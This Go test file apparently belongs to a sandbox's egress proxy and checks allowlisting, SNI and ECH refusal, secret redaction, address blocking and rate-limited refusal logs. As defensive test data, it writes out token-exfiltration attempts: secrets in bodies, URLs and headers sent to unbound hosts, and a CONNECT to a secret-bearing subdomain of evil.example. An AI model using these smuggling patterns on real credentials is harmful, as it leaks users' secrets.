package egress_test

import (
	"bufio"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/ecdh"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/http/httptest"
	"net/netip"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	. "github.com/Cygnux-Labs/tracekit-box/internal/egress"
	"github.com/Cygnux-Labs/tracekit-box/internal/egress/egressfake"
)

// startTLSRec is startTLS that also records every server name a client asked the upstream for.
func startTLSRec(t *testing.T, h http.Handler, names ...string) (string, func() []string) {
	t.Helper()
	ca := upstreamCA(t)
	var mu sync.Mutex
	var seen []string
	srv := httptest.NewUnstartedServer(h)
	srv.Config.ErrorLog = log.New(io.Discard, "", 0)
	srv.TLS = &tls.Config{GetCertificate: func(hello *tls.ClientHelloInfo) (*tls.Certificate, error) {
		mu.Lock()
		seen = append(seen, hello.ServerName)
		mu.Unlock()
		for _, n := range names {
			if hello.ServerName == n {
				return MintLeaf(ca, n)
			}
		}
		return nil, fmt.Errorf("no certificate for %q", hello.ServerName)
	}}
	srv.StartTLS()
	t.Cleanup(srv.Close)
	return port(t, srv.Listener.Addr()), func() []string {
		mu.Lock()
		defer mu.Unlock()
		return append([]string(nil), seen...)
	}
}

// startRaw starts a TCP upstream that runs serve on each connection and records every byte it receives.
func startRaw(t *testing.T, serve func(net.Conn)) (string, func() string) {
	t.Helper()
	l, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	var mu sync.Mutex
	var got bytes.Buffer
	var wg sync.WaitGroup
	go func() {
		for {
			c, err := l.Accept()
			if err != nil {
				return
			}
			wg.Add(1)
			go func() {
				defer wg.Done()
				defer c.Close()
				serve(&recConn{Conn: c, mu: &mu, buf: &got})
			}()
		}
	}()
	t.Cleanup(func() {
		l.Close()
		wg.Wait()
	})
	return port(t, l.Addr()), func() string {
		mu.Lock()
		defer mu.Unlock()
		return got.String()
	}
}

type recConn struct {
	net.Conn
	mu  *sync.Mutex
	buf *bytes.Buffer
}

func (c *recConn) Read(b []byte) (int, error) {
	n, err := c.Conn.Read(b)
	c.mu.Lock()
	c.buf.Write(b[:n])
	c.mu.Unlock()
	return n, err
}

// waitDenied waits for an egress.denied event whose reason contains want.
func (e *env) waitReason(kind, want string) Event {
	e.t.Helper()
	deadline := time.Now().Add(5 * time.Second)
	for {
		for _, ev := range e.sink.events() {
			if ev.Kind == kind && strings.Contains(ev.Reason, want) {
				return ev
			}
		}
		if time.Now().After(deadline) {
			e.t.Fatalf("no %s event with %q; have %+v", kind, want, e.sink.events())
		}
		time.Sleep(5 * time.Millisecond)
	}
}

// noSecret fails if s holds a secret's value (in its common encodings) or placeholder.
func noSecret(t *testing.T, what, s string, secrets ...Secret) {
	t.Helper()
	low := strings.ToLower(s)
	for _, sec := range secrets {
		forms := []string{sec.Value, base64.StdEncoding.EncodeToString([]byte(sec.Value)),
			base64.StdEncoding.EncodeToString([]byte("x-access-token:" + sec.Value))}
		for _, f := range forms {
			if strings.Contains(s, f) {
				t.Errorf("%s holds the value of secret %s: %q", what, sec.Name, s)
			}
		}
		if strings.Contains(low, strings.ToLower(sec.Placeholder)) {
			t.Errorf("%s holds the placeholder of secret %s: %q", what, sec.Name, s)
		}
	}
}

// ---- finding 1: what a tunnel carries ----

func TestTunnelSNIMustBeConnectHost(t *testing.T) {
	checkGoroutines(t)
	port, snis := startTLSRec(t, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { io.WriteString(w, "vhost "+r.Host) }),
		"example.com", "unlisted.test")
	e := newEnv(t, func(c *Config) { c.Allow = []string{"example.com:" + port, "127.0.0.1:" + port} })
	for _, tc := range []struct{ target, sni string }{{"example.com:" + port, "unlisted.test"}, {"127.0.0.1:" + port, "unlisted.test"}} {
		c, br, resp := e.rawConnect(tc.target)
		if resp.StatusCode != 200 {
			t.Fatalf("%s: %s", tc.target, resp.Status)
		}
		tc2 := tls.Client(&bufConn{Conn: c, r: br}, &tls.Config{ServerName: tc.sni, RootCAs: e.clientPool()})
		err := tc2.Handshake()
		if err == nil {
			t.Errorf("%s with SNI %s: handshake succeeded", tc.target, tc.sni)
		} else if !strings.Contains(err.Error(), "unrecognized name") {
			t.Errorf("%s: the guest's TLS error does not name the refusal: %v", tc.target, err)
		}
	}
	ev := e.waitReason(EventDenied, `TLS server name "unlisted.test" is not the CONNECT host example.com`)
	if ev.Host != "example.com" {
		t.Errorf("denied %+v", ev)
	}
	e.waitReason(EventDenied, `is not the CONNECT host 127.0.0.1`)
	for _, s := range snis() {
		if s == "unlisted.test" {
			t.Error("the upstream saw a ClientHello for a host off the allowlist")
		}
	}
	// The CONNECT host itself works, and the replayed ClientHello reaches the host unchanged.
	resp, err := e.client().Get("https://example.com:" + port + "/")
	if err != nil {
		t.Fatal(err)
	}
	if b := body(t, resp); b != "vhost example.com:"+port {
		t.Errorf("body %q", b)
	}
}

// echConfigList builds an ECHConfigList for a throwaway X25519 key whose public name is publicName.
func echConfigList(t *testing.T, publicName string) []byte {
	key, err := ecdh.X25519().GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	pub := key.PublicKey().Bytes()
	var c []byte
	c = append(c, 7)                             // config_id
	c = binary.BigEndian.AppendUint16(c, 0x0020) // DHKEM(X25519, HKDF-SHA256)
	c = binary.BigEndian.AppendUint16(c, uint16(len(pub)))
	c = append(c, pub...)
	c = binary.BigEndian.AppendUint16(c, 4)
	c = binary.BigEndian.AppendUint16(c, 0x0001) // HKDF-SHA256
	c = binary.BigEndian.AppendUint16(c, 0x0001) // AES-128-GCM
	c = append(c, 0, byte(len(publicName)))
	c = append(c, publicName...)
	c = binary.BigEndian.AppendUint16(c, 0) // extensions
	cfg := binary.BigEndian.AppendUint16(nil, 0xfe0d)
	cfg = binary.BigEndian.AppendUint16(cfg, uint16(len(c)))
	cfg = append(cfg, c...)
	return append(binary.BigEndian.AppendUint16(nil, uint16(len(cfg))), cfg...)
}

func TestTunnelRefusesECH(t *testing.T) {
	checkGoroutines(t)
	port, snis := startTLSRec(t, http.NotFoundHandler(), "example.com", "unlisted.test")
	gh := mkSecret(t, "GH", "", "other.example")
	e := newEnv(t, func(c *Config) {
		c.Allow = []string{"example.com:" + port, "other.example:" + port}
		c.Secrets = []Secret{gh}
	})
	// The outer server name is the CONNECT host; the encrypted inner one could be anything. Plain and inspected.
	for _, host := range []string{"example.com", "other.example"} {
		c, br, resp := e.rawConnect(host + ":" + port)
		if resp.StatusCode != 200 {
			t.Fatal(resp.Status)
		}
		tc := tls.Client(&bufConn{Conn: c, r: br}, &tls.Config{ServerName: "unlisted.test", RootCAs: e.clientPool(),
			MinVersion: tls.VersionTLS13, EncryptedClientHelloConfigList: echConfigList(t, host)})
		if err := tc.Handshake(); err == nil {
			t.Errorf("%s: an ECH handshake succeeded", host)
		}
	}
	ev := e.waitReason(EventDenied, "encrypted ClientHello (ECH) can't be checked")
	if ev.Host != "example.com" && ev.Host != "other.example" {
		t.Errorf("denied %+v", ev)
	}
	deadline := time.Now().Add(5 * time.Second)
	for n := 0; n < 2; {
		n = 0
		for _, ev := range e.sink.events() {
			if ev.Kind == EventDenied && strings.Contains(ev.Reason, "ECH") {
				n++
			}
		}
		if time.Now().After(deadline) {
			t.Fatalf("ECH refusals: %d, want 2", n)
		}
		time.Sleep(5 * time.Millisecond)
	}
	if s := snis(); len(s) != 0 {
		t.Errorf("the upstream saw ClientHellos %v", s)
	}
}

func TestTunnelNonTLSNeedsExplicitPort(t *testing.T) {
	checkGoroutines(t)
	// An approved host off the allowlist has no entry naming its port: like a bare entry on 443, TLS only.
	port, got := startRaw(t, func(c net.Conn) { io.Copy(io.Discard, c) })
	e := newEnv(t, func(c *Config) {
		c.Decider = &egressfake.Decider{Func: func(ctx context.Context, r Request) (Verdict, error) {
			return Verdict{Allow: true, Reason: "approved"}, nil
		}}
	})
	c, br, resp := e.rawConnect("example.com:" + port)
	if resp.StatusCode != 200 {
		t.Fatal(resp.Status)
	}
	io.WriteString(c, "GET / HTTP/1.1\r\nHost: unlisted.test\r\n\r\n")
	in, err := http.ReadResponse(br, nil)
	if err != nil {
		t.Fatalf("no refusal inside the tunnel: %v", err)
	}
	b := body(t, in)
	if in.StatusCode != 403 || !strings.Contains(b, "does not carry TLS") || !strings.Contains(b, "host:port") {
		t.Errorf("%s %q", in.Status, b)
	}
	e.waitReason(EventDenied, "does not carry TLS")
	time.Sleep(50 * time.Millisecond)
	if g := got(); g != "" {
		t.Errorf("the upstream received %q", g)
	}
}

func TestTunnelNonTLSWithExplicitPort(t *testing.T) {
	checkGoroutines(t)
	// A server that speaks first (SMTP) on an entry that names the port: its banner arrives before the guest
	// sends anything, and the guest's bytes pass unchanged.
	port, got := startRaw(t, func(c net.Conn) {
		io.WriteString(c, "220 smtp ready\r\n")
		line, err := bufio.NewReader(c).ReadString('\n')
		if err == nil {
			io.WriteString(c, "250 "+line)
		}
	})
	e := newEnv(t, func(c *Config) { c.Allow = []string{"example.com:" + port} })
	c, br, resp := e.rawConnect("example.com:" + port)
	if resp.StatusCode != 200 {
		t.Fatal(resp.Status)
	}
	start := time.Now()
	c.SetReadDeadline(time.Now().Add(3 * time.Second))
	banner, err := br.ReadString('\n')
	if err != nil || banner != "220 smtp ready\r\n" {
		t.Fatalf("banner %q %v", banner, err)
	}
	if d := time.Since(start); d > 2*time.Second {
		t.Errorf("banner took %v", d)
	}
	io.WriteString(c, "EHLO box\r\n")
	if l, err := br.ReadString('\n'); err != nil || l != "250 EHLO box\r\n" {
		t.Fatalf("reply %q %v", l, err)
	}
	c.Close()
	e.waitKind(EventClosed)
	if g := got(); g != "EHLO box\r\n" {
		t.Errorf("upstream got %q", g)
	}
}

func TestConnectPort80Refused(t *testing.T) {
	checkGoroutines(t)
	rec := &recorder{}
	hport := startHTTP(t, http.HandlerFunc(rec.handler))
	e := newEnv(t, func(c *Config) { c.Allow = []string{"example.com", "example.com:" + hport} })
	_, _, resp := e.rawConnect("example.com:80")
	b := body(t, resp)
	if resp.StatusCode != 403 || !strings.Contains(b, "port 80 tunnels are refused: send plain HTTP through the proxy") ||
		!strings.Contains(b, "http_proxy") {
		t.Errorf("%s %q", resp.Status, b)
	}
	e.waitReason(EventDenied, "port 80 tunnels are refused")
	if len(e.dec.Requests) != 0 {
		t.Errorf("the Decider was asked: %+v", e.dec.Requests)
	}
	// apt's way still works: absolute form, and the proxy writes Host itself whatever the client says.
	c := e.dialProxy()
	fmt.Fprintf(c, "GET http://example.com:%s/debian/dists/bookworm/InRelease HTTP/1.1\r\nHost: unlisted.test\r\nUser-Agent: Debian APT-HTTP/1.3\r\n\r\n", hport)
	resp, err := http.ReadResponse(bufio.NewReader(c), nil)
	if err != nil {
		t.Fatal(err)
	}
	if b := body(t, resp); resp.StatusCode != 200 || b != "ok" {
		t.Fatalf("%s %q", resp.Status, b)
	}
	rec.mu.Lock()
	defer rec.mu.Unlock()
	if h := rec.reqs[0].Host; h != "example.com:"+hport {
		t.Errorf("upstream Host %q", h)
	}
}

// ---- finding 2: values never reach the guest, and never leave anywhere else ----

// echoEnv binds GH (Authorization) to example.com and OTHER (X-Other) to other.example, with an upstream that
// echoes what it gets per the handler.
func echoEnv(t *testing.T, h http.HandlerFunc) (*env, string, Secret, Secret) {
	t.Helper()
	port := startTLS(t, h, "example.com", "other.example")
	gh := mkSecret(t, "GH", "Authorization", "example.com")
	gh.Value = "ghp_Real/Value+0123456789abcdef"
	other := mkSecret(t, "OTHER", "X-Other", "other.example")
	e := newEnv(t, func(c *Config) {
		c.Allow = []string{"example.com:" + port, "other.example:" + port}
		c.Secrets = []Secret{gh, other}
	})
	return e, port, gh, other
}

// rawGet sends one request through a fresh inspected tunnel and returns the raw response (no transparent gzip).
func rawGet(e *env, port, host, path string, hdr ...string) (*http.Response, string) {
	e.t.Helper()
	tc, br := e.tunnelTLS(host+":"+port, host)
	fmt.Fprintf(tc, "GET %s HTTP/1.1\r\nHost: %s:%s\r\n%s\r\n", path, host, port, strings.Join(append(hdr, ""), "\r\n"))
	resp, err := http.ReadResponse(br, nil)
	if err != nil {
		e.t.Fatal(err)
	}
	b, err := io.ReadAll(resp.Body)
	if err != nil {
		e.t.Fatalf("body: %v", err)
	}
	tc.Close()
	return resp, string(b)
}

func TestEchoedValueRedactedFromBody(t *testing.T) {
	checkGoroutines(t)
	var acceptEnc atomic.Value
	e, port, gh, other := echoEnv(t, func(w http.ResponseWriter, r *http.Request) {
		acceptEnc.Store(r.Header.Get("Accept-Encoding"))
		auth := r.Header.Get("Authorization")
		switch r.URL.Path {
		case "/plain":
			w.Header().Set("Content-Length", strconv.Itoa(len(auth)+12))
			io.WriteString(w, "you sent: "+auth+"\r\n")
		case "/chunked":
			// The value split across chunks and flushes, at every offset.
			fl := w.(http.Flusher)
			for i := 1; i < len(auth); i += 5 {
				io.WriteString(w, "["+auth[:i])
				fl.Flush()
				io.WriteString(w, auth[i:]+"]")
				fl.Flush()
			}
		case "/gzip":
			w.Header().Set("Content-Encoding", "gzip")
			zw := gzip.NewWriter(w)
			io.WriteString(zw, `{"headers":{"Authorization":"`+auth+`"}}`)
			zw.Close()
		case "/br":
			w.Header().Set("Content-Encoding", "br")
			io.WriteString(w, auth)
		case "/basic":
			io.WriteString(w, "echo "+auth)
		}
	})
	bearer := "Authorization: Bearer " + gh.Placeholder

	resp, b := rawGet(e, port, "example.com", "/plain", bearer)
	noSecret(t, "plain body", b, gh, other)
	if want := "you sent: Bearer " + strings.Repeat("x", len(gh.Value)) + "\r\n"; resp.StatusCode != 200 || len(b) != len(want) ||
		!strings.Contains(b, "[tkbox: redacted") || resp.ContentLength != int64(len(want)) {
		t.Errorf("plain: %s CL=%d %q", resp.Status, resp.ContentLength, b)
	}
	if ae, _ := acceptEnc.Load().(string); ae != "identity" {
		t.Errorf("a bound host was asked with Accept-Encoding %q", ae)
	}

	resp, b = rawGet(e, port, "example.com", "/chunked", bearer)
	noSecret(t, "chunked body", b, gh, other)
	if resp.StatusCode != 200 || strings.Count(b, "[tkbox: redacted") != (len("Bearer "+gh.Value)-1+4)/5 {
		t.Errorf("chunked: %s %q", resp.Status, b)
	}

	resp, b = rawGet(e, port, "example.com", "/gzip", bearer, "Accept-Encoding: gzip")
	noSecret(t, "gzip body", b, gh, other)
	if resp.StatusCode != 200 || resp.Header.Get("Content-Encoding") != "" || !strings.HasPrefix(b, `{"headers":{"Authorization":"Bearer [tkbox: redacted`) {
		t.Errorf("gzip: %s %v %q", resp.Status, resp.Header, b)
	}

	resp, b = rawGet(e, port, "example.com", "/br", bearer)
	noSecret(t, "br refusal", b+fmt.Sprint(resp.Header), gh, other)
	if resp.StatusCode != 502 || !strings.Contains(b, `content coding "br"`) {
		t.Errorf("br: %s %q", resp.Status, b)
	}

	// git's Basic form: the echo carries base64("x-access-token:<value>"), never the value itself.
	resp, b = rawGet(e, port, "example.com", "/basic",
		"Authorization: Basic "+base64.StdEncoding.EncodeToString([]byte("x-access-token:"+gh.Placeholder)))
	noSecret(t, "basic echo", b, gh, other)
	if resp.StatusCode != 200 || !strings.Contains(b, "redacted") {
		t.Errorf("basic: %s %q", resp.Status, b)
	}
}

func TestStreamedBodyNotHeldBack(t *testing.T) {
	checkGoroutines(t)
	release := make(chan struct{})
	e, port, gh, _ := echoEnv(t, func(w http.ResponseWriter, r *http.Request) {
		io.WriteString(w, "data: one\n\n")
		w.(http.Flusher).Flush()
		select {
		case <-release:
		case <-time.After(5 * time.Second):
		}
		io.WriteString(w, "data: two\n\n")
	})
	tc, br := e.tunnelTLS("example.com:"+port, "example.com")
	fmt.Fprintf(tc, "GET / HTTP/1.1\r\nHost: example.com:%s\r\nAuthorization: Bearer %s\r\n\r\n", port, gh.Placeholder)
	resp, err := http.ReadResponse(br, nil)
	if err != nil {
		t.Fatal(err)
	}
	r := bufio.NewReader(resp.Body)
	first := make(chan string, 1)
	go func() {
		l, _ := r.ReadString('\n')
		first <- l
	}()
	select {
	case l := <-first:
		if l != "data: one\n" {
			t.Fatalf("first %q", l)
		}
	case <-time.After(3 * time.Second):
		t.Fatal("the redactor held back a streamed event")
	}
	close(release)
	io.ReadAll(r)
	tc.Close()
}

func TestValueSmuggledElsewhereIsLeak(t *testing.T) {
	checkGoroutines(t)
	var mu sync.Mutex
	var seen []string
	e, port, gh, other := echoEnv(t, func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		mu.Lock()
		seen = append(seen, r.URL.String()+fmt.Sprint(r.Header)+string(b))
		mu.Unlock()
		io.WriteString(w, "ok")
	})
	b64 := base64.StdEncoding.EncodeToString([]byte(gh.Value))
	jsonEsc := strings.ReplaceAll(gh.Value, "/", `\/`)
	pct := strings.NewReplacer("/", "%2F", "+", "%2B").Replace(gh.Value)
	cases := []struct {
		name, host, method, path, body string
		hdr                            []string
		want                           string
	}{
		{"body to another host", "other.example", "POST", "/", "token=" + gh.Value, nil, "real value of secret GH is in the request body"},
		{"json body", "other.example", "POST", "/", `{"t":"` + jsonEsc + `"}`, nil, "real value of secret GH is in the request body"},
		{"form body", "other.example", "POST", "/", "t=" + pct + "&x=1", nil, "real value of secret GH is in the request body"},
		{"base64 body far in", "other.example", "POST", "/", strings.Repeat("A", 70000) + b64, nil, "real value of secret GH is in the request body"},
		{"body to its own host", "example.com", "POST", "/", gh.Value, nil, "real value of secret GH is in the request body"},
		{"url", "other.example", "GET", "/?k=" + pct, "", nil, "real value of secret GH is in the URL"},
		{"base64 header", "other.example", "GET", "/", "", []string{"X-Data: " + b64}, "real value of secret GH is in the X-Data header"},
		{"bound header, wrong host", "other.example", "GET", "/", "", []string{"Authorization: Bearer " + gh.Value}, "real value of secret GH is in the Authorization header"},
		{"wrong header, bound host", "example.com", "GET", "/", "", []string{"Cookie: s=" + gh.Value}, "real value of secret GH is in the Cookie header"},
	}
	for _, c := range cases {
		tc, br := e.tunnelTLS(c.host+":"+port, c.host)
		head := fmt.Sprintf("%s %s HTTP/1.1\r\nHost: %s:%s\r\n", c.method, c.path, c.host, port)
		for _, h := range c.hdr {
			head += h + "\r\n"
		}
		if c.body != "" {
			head += fmt.Sprintf("Content-Length: %d\r\n", len(c.body))
		}
		go func() { io.WriteString(tc, head+"\r\n"+c.body) }()
		resp, err := http.ReadResponse(br, nil)
		if err != nil {
			t.Errorf("%s: %v", c.name, err)
			continue
		}
		b := body(t, resp)
		if resp.StatusCode != 403 || !strings.Contains(b, c.want) {
			t.Errorf("%s: %s %q", c.name, resp.Status, b)
		}
		noSecret(t, c.name+" refusal", b+fmt.Sprint(resp.Header), gh, other)
		tc.Close()
	}
	// The value in its own header to its own host is where Box would put it anyway.
	resp, b := rawGet(e, port, "example.com", "/ok", "Authorization: Bearer "+gh.Value)
	if resp.StatusCode != 200 || b != "ok" {
		t.Errorf("value in its bound header: %s %q", resp.Status, b)
	}
	e.stop() // identical leaks back to back are summed; Close writes the last summary
	leaks := 0
	for _, ev := range e.sink.events() {
		if ev.Kind == EventSecretLeak && ev.Secret == "GH" {
			if m := repeatedRE.FindStringSubmatch(ev.Reason); m != nil {
				k, _ := strconv.Atoi(m[1])
				leaks += k
			} else {
				leaks++
			}
		}
	}
	if leaks != len(cases) {
		t.Errorf("%d leaks recorded for %d cases", leaks, len(cases))
	}
	mu.Lock()
	defer mu.Unlock()
	for i, s := range seen {
		if !strings.HasPrefix(s, "/ok") && (strings.Contains(s, gh.Value) || strings.Contains(s, b64) || strings.Contains(s, pct)) {
			t.Errorf("upstream request %d carried the value: %.200q", i, s)
		}
	}
}

func TestValueOverPlainHTTPIsLeak(t *testing.T) {
	checkGoroutines(t)
	rec := &recorder{}
	hport := startHTTP(t, http.HandlerFunc(rec.handler))
	gh := mkSecret(t, "GH", "", "example.com")
	e := newEnv(t, func(c *Config) {
		c.Allow = []string{"example.com:" + hport}
		c.Secrets = []Secret{gh}
	})
	for _, req := range []string{
		fmt.Sprintf("GET http://example.com:%s/?t=%s HTTP/1.1\r\n\r\n", hport, gh.Value),
		fmt.Sprintf("GET http://example.com:%s/ HTTP/1.1\r\nAuthorization: Bearer %s\r\n\r\n", hport, gh.Value),
		fmt.Sprintf("POST http://example.com:%s/ HTTP/1.1\r\nContent-Length: %d\r\n\r\n%s", hport, len(gh.Value), gh.Value),
		fmt.Sprintf("CONNECT %s.evil.example:443 HTTP/1.1\r\n\r\n", strings.ToUpper(gh.Value)),
	} {
		c := e.dialProxy()
		io.WriteString(c, req)
		resp, err := http.ReadResponse(bufio.NewReader(c), nil)
		if err != nil {
			t.Fatal(err)
		}
		b := body(t, resp)
		if resp.StatusCode != 403 || !strings.Contains(b, "real value of secret GH") {
			t.Errorf("%.60q: %s %q", req, resp.Status, b)
		}
		noSecret(t, "refusal", b, gh)
	}
	rec.mu.Lock()
	defer rec.mu.Unlock()
	for i, r := range rec.reqs {
		if strings.Contains(r.URL.String()+fmt.Sprint(r.Header)+rec.body[i], gh.Value) {
			t.Errorf("upstream received the value in request %d", i)
		}
	}
	for _, l := range e.res.lookups() {
		if strings.Contains(strings.ToLower(l), strings.ToLower(gh.Value)) {
			t.Errorf("a host carrying the value was resolved: %s", l)
		}
	}
}

func TestPlainHTTPUnboundHostNamedFirst(t *testing.T) {
	checkGoroutines(t)
	rec := &recorder{}
	hport := startHTTP(t, http.HandlerFunc(rec.handler))
	gh := mkSecret(t, "GH", "", "example.com")
	e := newEnv(t, func(c *Config) {
		c.Allow = []string{"example.com:" + hport, "other.example:" + hport}
		c.Secrets = []Secret{gh}
	})
	p, _ := strconv.Atoi(hport)
	for _, tc := range []struct {
		url, want string
		port      int
	}{
		{"http://other.example:" + hport + "/", "secret GH is not bound to this host", p},
		{"http://unlisted.example/", "secret GH is not bound to this host", 80},
		{"http://example.com:" + hport + "/", "secret GH would go over plain HTTP", p},
	} {
		n0 := len(e.sink.events())
		c := e.dialProxy()
		fmt.Fprintf(c, "GET %s HTTP/1.1\r\nAuthorization: Bearer %s\r\n\r\n", tc.url, gh.Placeholder)
		resp, err := http.ReadResponse(bufio.NewReader(c), nil)
		if err != nil {
			t.Fatal(err)
		}
		if b := body(t, resp); resp.StatusCode != 403 || !strings.Contains(b, tc.want) {
			t.Errorf("%s: %s %q", tc.url, resp.Status, b)
		}
		e.waitReason(EventSecretLeak, tc.want)
		var ev *Event
		for _, x := range e.sink.events()[n0:] {
			if x.Kind == EventSecretLeak {
				ev = &x
			}
		}
		if ev == nil || ev.Port != tc.port || !strings.Contains(tc.url, ev.Host) {
			t.Errorf("%s: leak event %+v, want port %d", tc.url, ev, tc.port)
		}
	}
	if rec.count() != 0 {
		t.Error("upstream reached")
	}
}

func TestSecretDefaultsToAuthorization(t *testing.T) {
	checkGoroutines(t)
	rec := &recorder{}
	port := startTLS(t, http.HandlerFunc(rec.handler), "example.com")
	gh := mkSecret(t, "GH", "", "example.com")
	e := newEnv(t, func(c *Config) {
		c.Allow = []string{"example.com:" + port}
		c.Secrets = []Secret{gh}
	})
	resp, b := rawGet(e, port, "example.com", "/", "Authorization: token "+gh.Placeholder)
	if resp.StatusCode != 200 || b != "ok" {
		t.Fatalf("%s %q", resp.Status, b)
	}
	if got := rec.reqs[0].Header.Get("Authorization"); got != "token "+gh.Value {
		t.Errorf("upstream Authorization %q", got)
	}
	resp, b = rawGet(e, port, "example.com", "/", "X-Api-Key: "+gh.Placeholder)
	if resp.StatusCode != 403 || !strings.Contains(b, "only sent in the Authorization header") {
		t.Errorf("%s %q", resp.Status, b)
	}
	if rec.count() != 1 {
		t.Errorf("upstream saw %d requests", rec.count())
	}
}

// ---- finding 3: no wildcard secret hosts ----

func TestSecretWildcardHostRefused(t *testing.T) {
	ca, err := NewCA("b")
	if err != nil {
		t.Fatal(err)
	}
	_, err = New(Config{Decider: &egressfake.Decider{}, Sink: &egressfake.Sink{}, CA: ca,
		Secrets: []Secret{mkSecret(t, "PAGES", "", "api.example.com", "*.github.io")}})
	if err == nil || !strings.Contains(err.Error(), "secret PAGES") || !strings.Contains(err.Error(), "*.github.io") ||
		!strings.Contains(err.Error(), "exact hosts") {
		t.Errorf("New: %v", err)
	}
	if _, err := New(Config{Decider: &egressfake.Decider{}, Sink: &egressfake.Sink{}, CA: ca,
		Secrets: []Secret{mkSecret(t, "PAGES", "", "api.example.com", "203.0.113.9")}}); err != nil {
		t.Errorf("exact hosts and an IP literal refused: %v", err)
	}
}

// ---- finding 4: a live address check ----

func TestBlockFuncLiveCheck(t *testing.T) {
	checkGoroutines(t)
	port := startTLS(t, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { io.WriteString(w, "ok") }), "example.com", "other.example")
	var calls atomic.Int32
	var armed atomic.Int32 // >0: the loopback address becomes the host's after that many more checks pass
	e := newEnv(t, func(c *Config) {
		c.Allow = []string{"example.com:" + port, "other.example:" + port, "blocked.example:" + port, "boom.example:" + port,
			"prefix.example:" + port}
		c.BlockPrefixes = []netip.Prefix{netip.MustParsePrefix("192.0.2.7/32")}
		c.BlockFunc = func(a netip.Addr) (bool, string) {
			calls.Add(1)
			switch {
			case a == netip.MustParseAddr("198.51.100.0"):
				panic("broken check")
			case a == netip.MustParseAddr("192.0.2.1"):
				return true, "host's own"
			case a == netip.MustParseAddr("127.0.0.1") && armed.Load() > 0 && armed.Add(-1) == 0:
				return true, "host's own"
			}
			return false, ""
		}
	})
	e.res.set("blocked.example", "192.0.2.1")
	e.res.set("boom.example", "198.51.100.0")
	e.res.set("prefix.example", "192.0.2.7")
	resp, err := e.client().Get("https://example.com:" + port + "/")
	if err != nil {
		t.Fatal(err)
	}
	if b := body(t, resp); b != "ok" || calls.Load() < 2 {
		t.Fatalf("%q, BlockFunc called %d times (want at resolve and at dial)", b, calls.Load())
	}
	for host, why := range map[string]string{"blocked.example": "(host's own)", "boom.example": "(the operator's address check failed)",
		"prefix.example": "operator blocked, which"} {
		_, _, r := e.rawConnect(host + ":" + port)
		reason := r.Header.Get("X-Tkbox-Reason")
		if r.StatusCode != 403 || !strings.Contains(reason, why) ||
			!strings.Contains(reason, "it resolves to an address of this host or one the operator blocked") {
			t.Errorf("%s: %s %q", host, r.Status, reason)
		}
		r.Body.Close()
	}
	// The address becomes the host's between the resolve and the dial: the dial-time check refuses it.
	armed.Store(2)
	_, _, r := e.rawConnect("other.example:" + port)
	if r.StatusCode != 502 || !strings.Contains(r.Header.Get("X-Tkbox-Reason"), "refusing to dial") ||
		!strings.Contains(r.Header.Get("X-Tkbox-Reason"), "host's own") {
		t.Errorf("dial-time check: %s %q", r.Status, r.Header.Get("X-Tkbox-Reason"))
	}
	r.Body.Close()
}

// ---- finding 5: refusals can't flood the Sink ----

var (
	moreRE     = regexp.MustCompile(`^(\d+) more refusals in the last second`)
	repeatedRE = regexp.MustCompile(`\(repeated (\d+) more times in the last second\)$`)
)

func TestDeniedEventsAreLimited(t *testing.T) {
	checkGoroutines(t)
	gh := mkSecret(t, "GH", "", "example.com")
	e := newEnv(t, func(c *Config) {
		c.Allow = []string{"example.com"}
		c.Secrets = []Secret{gh}
	})
	const n = 120
	var wg sync.WaitGroup
	for i := 0; i < n; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			c, err := net.Dial("tcp", e.addr)
			if err != nil {
				t.Error(err)
				return
			}
			defer c.Close()
			c.SetDeadline(time.Now().Add(5 * time.Second))
			io.WriteString(c, "CONNECT example.com:80 HTTP/1.1\r\n\r\n")
			if resp, err := http.ReadResponse(bufio.NewReader(c), nil); err == nil {
				resp.Body.Close()
			}
		}()
	}
	wg.Wait()
	const leaks = 10
	for i := 0; i < leaks; i++ {
		_, _, resp := e.rawConnect(gh.Placeholder + ".evil.example:443")
		resp.Body.Close()
	}
	e.stop() // Close writes the pending summaries
	single, summed, leakEvents, repeated := 0, 0, 0, 0
	for _, ev := range e.sink.events() {
		switch ev.Kind {
		case EventDenied:
			if m := moreRE.FindStringSubmatch(ev.Reason); m != nil {
				k, _ := strconv.Atoi(m[1])
				summed += k
			} else {
				single++
			}
		case EventSecretLeak:
			leakEvents++
			if strings.Contains(ev.Reason, "repeated 9 more times") {
				repeated++
			}
		}
	}
	if single+summed != n {
		t.Errorf("%d recorded + %d summed refusals, want %d in all", single, summed, n)
	}
	if single > 3*20 || summed == 0 {
		t.Errorf("%d refusals recorded one by one, %d summed", single, summed)
	}
	if leakEvents != 2 || repeated != 1 {
		t.Errorf("%d leak events (%d summaries) for %d identical leaks, want the first and one summary", leakEvents, repeated, leaks)
	}
}
